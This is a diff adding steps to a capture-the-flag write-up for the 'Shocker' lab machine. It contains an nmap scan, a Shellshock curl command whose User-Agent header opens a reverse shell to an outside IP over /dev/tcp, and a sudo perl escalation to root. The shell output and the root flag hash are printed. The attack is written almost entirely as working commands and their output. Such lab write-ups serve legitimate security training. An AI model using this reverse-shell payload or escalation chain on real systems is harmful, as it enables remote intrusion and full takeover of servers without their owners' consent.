@@ -1,5 +1,4 @@
 
-
 ```
 sudo nmap -sV shocker.htb
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-15 21:59 CEST
@@ -38,5 +37,35 @@ While looking at
 http://shocker.htb/cgi-bin/user.sh
 
 from there all we need is a shell 
+```bash
 curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/10.10.14.11/4444 0>&1"' http://shocker.htb/cgi-bin/user.sh
+```
 
+
+
+```bash
+shelly@Shocker:/home$ cd shelly
+cd shelly
+shelly@Shocker:/home/shelly$ cat user.txt
+cat user.txt
+
+shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+    
+shelly@Shocker:/usr/lib/cgi-bin$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
+sudo /usr/bin/perl -e 'exec "/bin/bash";'
+whoami
+root
+
+cd /root
+ls
+root.txt
+cat root.txt
+e435766c3a474bc01d29d3a5ac17c3c4
+```
